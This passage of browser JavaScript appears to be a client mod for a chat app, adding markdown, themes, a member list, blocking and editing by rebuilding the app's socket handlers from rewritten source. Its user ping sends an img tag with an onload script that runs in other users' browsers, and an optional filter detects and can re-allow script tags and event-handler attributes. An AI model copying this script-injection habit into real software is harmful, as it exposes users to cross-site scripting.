			attr: e => e.style.textDecoration = "underline"
		},
		{
			symbol: "_",
			regex: /(?<!\\)_((?:.|\n)+?)(?<!\\)_/g,
			element: "span",
			attr: e => e.style.fontStyle = "italic"
		},
		{
			symbol: "~~",
			regex: /(?<!\\)~{2}([^~](?:.|\n)*?)(?<!\\)~{2}/g,
			element: "span",
			attr: e => e.style.textDecoration = "line-through"
		},
		{
			symbol: "```",
			regex: /(?<!\\)`{3}([^`](?:.|\n)*?)(?<!\\)`{3}/g,
			element: "pre",
			attr: e => {
				e.style.background = "#80808040";
				e.style.padding = "0.5em 1em";
				e.style.margin = "0";
				e.style.borderRadius = "0.5em";
				e.classList.add("ocat-large-code");
			}
		},
		{
			symbol: "`",
			regex: /(?<!\\)`((?:.|\n)+?)(?<!\\)`/g,
			element: "code",
			attr: e => {
				e.style.background = "#80808040";
				e.style.padding = "0.3em";
				e.style.borderRadius = "0.5em";
				e.classList.add("ocat-small-code");
			}
		}
	];
	var sandbox = document.createElement("span");
	sandbox.textContent = msg;

	var namePrefix = document.createElement("span");
	namePrefix.textContent = `${name}: `;
	namePrefix.classList.add('ocat-left');

	var escapedContent = sandbox.outerHTML;
	var matched = false;
	replacements.forEach(r => {
		escapedContent = escapedContent.replace(r.regex, (match, content, offset, string) => {
			matched = true;
			var el = document.createElement(r.element);
			r.attr(el);
			el.innerHTML = content;
			return el.outerHTML;
		}).replaceAll(`\\${r.symbol}`, r.symbol);
	});
	if(matched) {
		socket.emit('html-message', namePrefix.outerHTML + escapedContent);
	} else {
		socket.emit('message', `${name}: ${msg}`);
	}
};

ocat._hooks.send = (msg) => {
	if(msg.startsWith("/")) {
		for(var cmd of ocat._commands) {
			if(msg == `/${cmd.name}` || msg.startsWith(`/${cmd.name} `)) {
				if(cmd.action) {
					cmd.action(msg);
					return;
				}
			}
		}
	}
	if(ocat.useMarkdown) {
		ocat._hooks.markdown(username, msg);
	} else {
		socket.emit('message', `${username}: ${msg}`);
	}
}

var messageToolbar = document.createElement("div");
messageToolbar.id = "ocat-message-toolbar";

var inputWrapper = document.createElement("div");
inputWrapper.id = "ocat-input-wrapper";

var messageContainer = document.createElement("div");
messageContainer.classList.add("ocat-grow-wrap");
var messageInput = document.createElement("textarea");
messageInput.id = "message-input";
messageInput.setAttribute("rows", 1);
messageInput.setAttribute("spellcheck", false);
messageInput.addEventListener("input", e => {
	e.target.parentNode.dataset.replicatedValue = e.target.value;
});
messageInput.addEventListener("keypress", e => {
	if(!ocat.silentTyping) {
		socket.emit("typing", username, true);
		clearTimeout(typingIdle);
		typingIdle = setTimeout(() => socket.emit("typing", username, false), 3e3);
	}
	if(e.key == "Enter" && !(e.ctrlKey || e.shiftKey)) {
		if(e.target.value) {
			ocat._hooks.send(e.target.value);
			e.target.value = "";
			e.target.parentElement.dataset.replicatedValue = "";
			if(!ocat.silentTyping) socket.emit("typing", username, false);
		};
		e.preventDefault();
	}
});
messageContainer.appendChild(messageInput);
inputWrapper.appendChild(messageContainer);

var typingIndicator = document.getElementById("typing-users");
inputWrapper.appendChild(typingIndicator);
messageToolbar.appendChild(inputWrapper);

var nameSelector = document.createElement("label");
nameSelector.classList.add("ocat-input-container");
nameSelector.id = "ocat-name-selector-container";
nameSelector.setAttribute("for", "ocat-name-selector");

var namePrefix = document.createElement("span");
namePrefix.textContent = "@";
namePrefix.classList.add("ocat-prefix");
nameSelector.appendChild(namePrefix);

var nameInput = document.getElementById("name-selector");
if(!nameInput) {
	nameInput = document.createElement("input");
	nameInput.value = username;
	nameInput.addEventListener("change", e => {
		username = e.target.value;
		localStorage.username = username;
	});
}
ocat._oldUsername = username;
nameInput.id = "ocat-name-selector";
nameInput.setAttribute("spellcheck", false);
nameInput.addEventListener("change", e => {
	if(ocat._oldUsername in ocat._userHistory) {
		ocat._userHistory[ocat._oldUsername].element.remove();
		ocat._hooks.updateUserData(e.target.value, {
			active: true,
			online: ocat._userHistory[ocat._oldUsername].online,
		});
		delete ocat._userHistory[ocat._oldUsername];
	}
	ocat._oldUsername = username;
	document.getElementById("message-input").focus();
});
nameSelector.appendChild(nameInput);

messageToolbar.prepend(nameSelector);

document.getElementById("message-input").replaceWith(messageToolbar);

var sidebar = document.createElement("div");
sidebar.id = "ocat-sidebar";

var memberList = document.createElement("ul");
memberList.id = "ocat-member-list";
sidebar.appendChild(memberList);

var settinsContainer = document.createElement("div");
settinsContainer.id = "ocat-settings-container";

var themeSelector = document.createElement("button");
themeSelector.textContent = "\u{1F3A8}";
themeSelector.classList.add("ocat-settings-button");
var themeSelectorTooltipContainer = document.createElement("div");
themeSelectorTooltipContainer.id = "ocat-theme-tooltip";
themeSelectorTooltipContainer.classList.add("ocat-tooltip");
var themeSelectorTooltip = document.createElement("div");
themeSelectorTooltip.classList.add("ocat-grid");
themeSelectorTooltip.addEventListener("scroll", e => {
	e.target.style.setProperty("--ocat-theme-scroll", `${e.target.scrollLeft}px`);
});

themeSelector.addEventListener("click", e => {
	e.stopPropagation();
	document.getElementById("ocat-theme-tooltip").classList.toggle("ocat-active");
});

ocat._themes = [];
const ocat_themeMap = {
	"light-theme": "Light Mode",
	"udark-theme": "Ultra Dark Mode",
};
const ocat_classMap = {
	"light-theme": "lightmode",
	"udark-theme": "ultradarkmode",
};
[...document.querySelectorAll(".right.sidebar button.themebutton"),
	...document.querySelectorAll(".right.sidebar button.button")].forEach(el => {
		// theme button
		var themeClass = ocat_classMap[el.id]
			|| el.id.replace(/-theme(\d*)$/, (/\b\w*mode\d*\b/i.test(el.className) ? "mode$1" : "theme$1"))
				.replace(/-/g, "");
		var themeButton = document.createElement("button");
		ocat._themes.push(themeClass);
		themeButton.title = ocat_themeMap[el.id]
			|| el.id.replace(/-/g, " ")
			.replace("theme", (/\b\w*mode\d*\b/i.test(el.className) ? "mode" : "theme"))
				.replace(/\b\w/g, ch => ch.toUpperCase());
		themeButton.classList.add("ocat-settings-button");
		themeButton.classList.add("ocat-theme-button");
		themeButton.classList.add(themeClass);
		var tooltip = ocat._addThemeTooltip(themeButton, () => { }, () => { });
		tooltip.classList.add(themeClass);
		themeButton.addEventListener("click", function(e) {
			document.getElementById("ocat-theme-tooltip").classList.toggle("ocat-active", false);
			ocat.theme = themeClass;
			ocat._saveSettings();
		}, {
			capture: true
		});
		themeSelectorTooltip.appendChild(themeButton);
});

var customThemeButton = document.createElement("input");
customThemeButton.type = "file";
customThemeButton.setAttribute("multiple", true);
customThemeButton.style.display = "none";
customThemeButton.id = "ocat-custom-theme-selector";
const ocat_iconCanvas = new OffscreenCanvas(32, 32);
const ocat_iconContext = ocat_iconCanvas.getContext('2d', {
	willReadFrequently: true
});
customThemeButton.addEventListener("change", function(e) {
	document.getElementById("ocat-theme-tooltip").classList.toggle("ocat-active", false);
	if(!this.files.length) return;
	var files = [...this.files];
	function addImage(blob, callback) {
		var tempUrl = URL.createObjectURL(blob);
		var img = new Image();
		img.addEventListener("load", function(e) {
			ocat_iconContext.imageSmoothingEnabled = true;
			ocat_iconContext.clearRect(0, 0, 32, 32);
			// Center image in square
			var hPad = 0;
			var vPad = 0;
			if(img.naturalWidth > img.naturalHeight) {
				hPad = (img.naturalWidth - img.naturalHeight) / 2;
			} else {
				vPad = (img.naturalHeight - img.naturalWidth) / 2;
			}
			ocat_iconContext.drawImage(e.target, hPad, vPad, img.naturalWidth - 2 * hPad, img.naturalHeight - 2 * vPad, 0, 0, 32, 32);
			ocat_iconCanvas.convertToBlob().then(icon => {
				ocat._addFile(blob, icon, function(hash) {
					var result = callback(hash, icon);
					if(result) {
						addImage(result, callback);
					}
				});
			});
			URL.revokeObjectURL(tempUrl);
		});
		img.src = tempUrl;
	}
	if(files.length > 1) {
		addImage(files.shift(), (hash, icon) => {
			ocat._addThemeButton(hash, icon);
			return files.shift();
		});
	} else {
		addImage(files.shift(), (hash, icon) => {
			ocat._addThemeButton(hash, icon);
			ocat.theme = `custom-background("${hash}")`;
			ocat._saveSettings();
		});
	}
});
var customThemeLabel = document.createElement("label");
customThemeLabel.title = "Custom Background";
customThemeLabel.classList.add("ocat-settings-button");
customThemeLabel.id = "ocat-custom-theme-label";
customThemeLabel.classList.add("ocat-custom-background-theme");
customThemeLabel.setAttribute("for", "ocat-custom-theme-selector");
customThemeLabel.addEventListener("click", e => e.stopPropagation());
ocat._customThemeButton = customThemeLabel;
themeSelectorTooltip.appendChild(customThemeLabel);
themeSelectorTooltip.appendChild(customThemeButton);

var randomThemeButton = document.createElement("button");
randomThemeButton.textContent = "\u{1F3B2}";
randomThemeButton.title = "Random Theme";
randomThemeButton.classList.add("ocat-settings-button");
randomThemeButton.id = "ocat-random-theme-button";
randomThemeButton.addEventListener("click", function(e) {
	e.stopPropagation();
	var buttons = [...e.target.parentElement.querySelectorAll(":scope .ocat-theme-button")];
	buttons[Math.floor(Math.random() * buttons.length)].click();
});
themeSelectorTooltip.appendChild(randomThemeButton);

ocat._forAllFiles(file => {
	ocat._addThemeButton(file.hash, file.icon);
});

settinsContainer.appendChild(themeSelector);
themeSelectorTooltipContainer.appendChild(themeSelectorTooltip);
settinsContainer.appendChild(themeSelectorTooltipContainer);
sidebar.appendChild(settinsContainer);
document.body.appendChild(sidebar);

var whitelist = {
	'message-container': 1,
	'ocat-message-toolbar': 1,
	'ocat-sidebar': 1
};
// remove unknown children
[...document.body.children].forEach(el => {
	if(!(el.id in whitelist)
		&& el.checkVisibility()) el.remove();
});

ocat._hooks.pingUsers = () => {
	for(var user in ocat._userHistory) {
		if(user == username) continue;
		ocat._userHistory[user].online = false;
		ocat._userHistory[user].element.classList.toggle("ocat-online", false);
	}
	socket.emit("html-message", `<img class="ocat-user-ping-message anti-flow-message" src="${ocat._EMPTY_IMAGE_URL}" onload="socket.emit('pongUser', username);this.parentElement.remove();" style="width:0px;height:0px;"/>`);
};

ocat._hooks.updateUserData = (user, data) => {
	if(!(user in ocat._userHistory)) {
		if(user.startsWith("[DM] ")) user = user.substring(5);
		if(user.startsWith("[OCat]") || user == "Help") return;
		var el = document.createElement("li");
		el.textContent = user;
		ocat._userHistory[user] = {
			online: false,
			lastOnline: null,
			lastActive: null,
			element: el,
		};
		el.addEventListener("contextmenu", e => ocat._showContextMenu(e, [
			{
				label: ocat.blockedUsers.has(e.target.textContent) ? "Unblock" : "Block",
				action: ((user) => {
					if(!ocat.blockedUsers.delete(user)) {
						ocat.blockedUsers.add(user);
					}
				}).bind(null, e.target.textContent)
			}
		]));
		memberList.appendChild(el);
	}
	if("online" in data && ocat._userHistory[user].online != data.online) {
		ocat._userHistory[user].online = data.online;
		ocat._userHistory[user].element.classList.toggle("ocat-online", data.online);
		ocat._userHistory[user].lastOnline = Date.now();
	}
	if("active" in data) {
		ocat._userHistory[user].lastActive = Date.now();
		if(!ocat._userHistory[user].online) ocat._hooks.pingUsers();
	}
};

ocat._hooks.possibleConnectMessage = (m) => {
	if(/^(.*) joined\s*the\s*chat.*\.?\s*$/i.test(m)) {
		ocat._hooks.updateUserData(m.replace(/^(.*) joined\s*the\s*chat.*\.?\s*$/i, "$1"), { active: true });
	}
	if(/^(.*) left\s*the\s*chat.*\.?\s*$/i.test(m)) {
		ocat._hooks.updateUserData(m.replace(/^(.*) left\s*the\s*chat.*\.?\s*$/i, "$1"), { online: false });
		ocat._hooks.pingUsers();
	}
};

function patch(channel, predicate, patcher) {
	console.log("Attempting patch for", channel);
	if(!socket.listeners(channel).length) {
		console.log("Skipped patch due to missing targets", channel, predicate, patcher);
		return;
	}
	var hit = false;
	socket.listeners(channel).forEach((c, i, a) => {
		if(!predicate(c)) return;
		hit = true;
		a[i] = new Function(`return (${patcher(c.toString())})`)();
	});
	if(!hit) console.log("Patch did not match any targets", channel, predicate, patcher);
}

ocat._hooks.toggleXSS = (el, id) => {
	var xss = ocat._xssIds[id];
	if(xss.allowed) {
		xss.revoke(document);
		el.textContent = "Allow";
	} else {
		xss.allow(document);
		el.textContent = "Revoke";
	}
	xss.allowed = !xss.allowed;
};

const idGenerator = () => "ocat_xss_" + Math.random().toString().replace(".", "");
ocat._hooks.antiXss = (msg) => {
	var xssAttempts = [];
	var sandbox = document.createElement("template");
	sandbox.innerHTML = msg;
	sandbox.content.querySelectorAll("script").forEach(n => {
		var id = idGenerator();
		n.classList.add(id);
		ocat._xssIds[id] = {
			id: id,
			content: n.outerHTML,
			detail: n.outerHTML,
			allow(dom) {
				dom.querySelector('.' + this.id).outerHTML = this.content;
			},
			revoke(dom) {
				var script = document.createElement("script");
				script.classList.add(this.id);
				dom.querySelector('.' + this.id).replaceWith(script);
			}
		};
		xssAttempts.push(id);
	});
	sandbox.content.querySelectorAll("*").forEach(n => {
		for(var i of n.attributes) {
			// event, possibly xss
			if(i.name.toLowerCase().startsWith("on")
				//javascript: url?
				|| (/href|src/i.test(i.name) && /^(vb|java|live)script:/i.test(i.value))) {
				if(n.classList.contains("ocat-user-ping-message")) continue;
				var id = idGenerator();
				n.classList.add(id);
				ocat._xssIds[id] = {
					id: id,
					content: [i.name, i.value],
					isMedia: n.hasAttribute("src"),
					detail: `${i.name} = ${i.value}`,
					allow(dom) {
						var el = dom.querySelector('.' + this.id);
						el.setAttribute(this.content[0], this.content[1].replace(";this.parentElement.remove();", ""));
						if(this.isMedia) el.setAttribute("src", el.getAttribute("src"));
					},
					revoke(dom) {
						dom.querySelector('.' + this.id).removeAttribute(this.content[0]);
					}
				};
				xssAttempts.push(id);
			}
		}
	});
	if(xssAttempts.length) {
		var list = document.createElement("ul");
		for(var xssId of xssAttempts) {
			var xss = ocat._xssIds[xssId];
			var el = document.createElement("li");
			el.textContent = xss.detail + " ";
			xss.revoke(sandbox.content);
			xss.allowed = false;
			var revokeButton = document.createElement("button");
			revokeButton.textContent = "Allow";
			revokeButton.setAttribute("onclick", `ocat._hooks.toggleXSS(this, "${xssId}")`);
			el.appendChild(revokeButton);
			list.appendChild(el);
		}
		var title = document.createElement("div");
		title.textContent = "XSS Attempts?:";
		sandbox.content.appendChild(title);
		sandbox.content.appendChild(list);
	}
	msg = sandbox.innerHTML;
	return msg;
};

ocat._hooks.htmlMsg = (msg, id) => {
	var sandbox = document.createElement("template");
	sandbox.innerHTML = msg;
	var namePrefix = sandbox.content.querySelector(".ocat-left");
	var ping = sandbox.content.querySelector(".ocat-user-ping-message");
	var js = sandbox.content.querySelector("img[onload]");
	if(namePrefix && /^(.*):\s*$/.test(namePrefix.textContent)) {
		ocat._hooks.updateUserData(namePrefix.textContent.replace(/^(.*):\s*$/, "$1"), { active: true });
		if(ocat.blockedUsers.has(namePrefix.textContent.replace(/^(.*):\s*$/, "$1"))) {
			namePrefix.classList.add("ocat-blocked");
		}
	} else if(!ping) {
		ocat._hooks.pingUsers();
	}
	if(js && js.getAttribute("onload").includes(";this.parentElement.remove();") && !js.classList.contains("ocat-persistant")) {
		setTimeout(() => {
			socket.emit("delete-message", id);
		}, 2000);
	}
	if(ping && ocat.vanish) {
		ping.setAttribute("onload", "this.parentElement.remove();");
		ping.setAttribute("onerror", "this.parentElement.remove();");
	}
	return sandbox.innerHTML;
};

ocat._hooks.onMessageContainer = (el, msg, id, type) => {
	el.setAttribute("tabindex", -1);
	// el.dataset.ocatMessageId = id;
	// Remove OCat client messages
	if(id < 0) return true;
	el.addEventListener("contextmenu", e => ocat._showContextMenu(e, [
		{
			label: "Edit",
			action: ((el) => {
				el.setAttribute("contenteditable", true);
				el.addEventListener("keypress", e => {
					if(e.key == "Enter" && !(e.ctrlKey || e.shiftKey)) {
						el.removeAttribute("contenteditable");
						ocat._editMessage(e.target.dataset.messageId, el.innerHTML);
						e.preventDefault();
					}
				});
			}).bind(null, e.target)
		},
		{
			label: "Delete",
			classes: ["ocat-important-action"],
			action: ((id) => {
				ocat._deleteMessage(id);
			}).bind(null, e.target.dataset.messageId)
		}
	]));
	ocat._notify(msg, type, el);
	return !document.querySelector(`#message-container > div[data-message-id="${id}"]`);
}

patch("message",
	c => c.toString().includes("finalContent"),
	c => c.replace(/(?<!function\s*\()msg(?!(?:,\s*[a-zA-Z_0-9]+(?:\s*=(?!>)\s*.*?)?)*\)?\s*=>)/, `
		var ocat_messageContent = msg.split(':');
		var ocat_prefix = null;
		if(ocat_messageContent.length > 1) {
			ocat._hooks.updateUserData(ocat_messageContent[0], {active: true});
			ocat_prefix = document.createElement("span");
			if(ocat.blockedUsers.has(ocat_messageContent[0])) ocat_prefix.classList.add('ocat-blocked');
			ocat_prefix.classList.add('ocat-left');
			ocat_prefix.textContent = ocat_messageContent.shift() + ':';
		}
		msg = ocat_messageContent.join(':');
		msg`)
		// .replace(/^\s*(function\s*)\(((?:[a-zA-Z_0-9]+(?:\s*=\s*.*?)?),?\s*)*\)/, "$1($2, ocat_id)")
		// .replace(/^\s*\(?((?:[a-zA-Z_0-9]+(?:\s*=(?!>)\s*.*?)?,?\s*)*)\)?(\s*=>)/, "($1, ocat_id)$2")
		.replace(/([a-zA-Z0-9_]+)\.style\.color\s*=\s*(['"`])blue\2/g,
			`$1.classList.add($2ocat-link$2)`)
		.replace(/([a-zA-Z0-9_]+)\.append\s*\((.*)\)\s*;?\s*$/gm,
		`var ocat_suffix = document.createElement("span");
			ocat_suffix.append($2);
			if(ocat_prefix) $1.appendChild(ocat_prefix);
			$1.appendChild(ocat_suffix);`)
		.replace(/(document\.getElementById\((['"`])message-container\2\).appendChild)\((.*)\)/,
			`var ocat_messageContainer = ($3);
			if(ocat._hooks.onMessageContainer(ocat_messageContainer, msg, id, "CHAT"))
				$1(ocat_messageContainer)`)
);

patch("html-message",
	() => true,
	c => c
		.replace(/(?<!function\s*\()msg(?!(?:,\s*[a-zA-Z_0-9]+(?:\s*=(?!>)\s*.*?)?)*\)?\s*=>)/g,
			"((ocat.antiXss ? ocat._hooks.antiXss(ocat._hooks.htmlMsg(msg, id)) : ocat._hooks.htmlMsg(msg, id)))")
		// .replace(/^\s*(function\s*)\(((?:[a-zA-Z_0-9]+(?:\s*=\s*.*?)?),?\s*)*\)/, "$1($2, ocat_id)")
		// .replace(/^\s*\(?((?:[a-zA-Z_0-9]+(?:\s*=(?!>)\s*.*?)?,?\s*)*)\)?(\s*=>)/, "($1, ocat_id)$2")
		.replace(/(document\.getElementById\((['"`])message-container\2\).appendChild)\((.*)\)/,
			`var ocat_messageContainer = ($3);
			if(ocat._hooks.onMessageContainer(ocat_messageContainer, msg, id, "HTML"))
				$1(ocat_messageContainer)`)
);

['message', 'html-message'].forEach(type => {
	socket.on(type, function(msg) {
		var msgs = document.getElementById("message-container");
		if(msgs.scrollHeight - msgs.scrollTop - msgs.clientHeight < 100 + msgs.lastElementChild.getBoundingClientRect().height || Date.now() - ocat._START_TIME < 10e3)
			msgs.scrollTop = msgs.scrollHeight;
	});
});

socket.on("pongUser", (user, id) => {
	socket.emit("delete-message", id);
	if(user)
		ocat._hooks.updateUserData(user, { online: true });
});

// Load settings
if(ocat._SETTINGS_KEY in localStorage) {
	var settings = JSON.parse(localStorage.getItem(ocat._SETTINGS_KEY));
	for(var key in settings) {
		if(ocat.hasOwnProperty(key) && !key.startsWith("_")) {
			ocat[key] = settings[key];
		}
	}
}

if(!ocat.notificationSound)
	ocat.notificationSound = "https://cdn.pixabay.com/download/audio/2023/03/18/audio_900b6765ed.mp3?filename=the-notification-email-143029.mp3";

function onKeyInput(e) {
	if(e.key != "Shift") return;
	document.body.classList.toggle("ocat-shifting", e.shiftKey);
}
window.addEventListener("keydown", onKeyInput);
window.addEventListener("keyup", onKeyInput);
window.addEventListener("click", e => {
	[...document.getElementsByClassName("ocat-active")].forEach(el => {
		el.classList.remove("ocat-active");
	});
	[...document.getElementsByClassName("ocat-context-menu")].forEach(el => el.remove());
});

document.getElementById("message-container").scrollTop = document.getElementById("message-container").scrollHeight;

socket.emit("message-history");
ocat._hooks.updateUserData(username, { active: true });
setInterval(ocat._hooks.pingUsers, 30000);
ocat._bannerMessage("success", "ocat ready!", 3000);
var ocat_scriptHash = [...document.scripts].find(s => s.textContent).textContent.hashCode();
if(ocat_scriptHash != ocat._LAST_SEEN_CCAT_HASH) {
	ocat._clientMessage(
		`CCat has changed since this OCat version has released.
Are you using latest version? If so, a new OCat version may be released soon to hide this message.
OCat may not work as expected during this period, so please remain patient as we update.`);
	if(ocat.devMessages) {
		ocat._clientMessage(`CCat script file changed (new hash '${ocat_scriptHash}').`);
	}
}
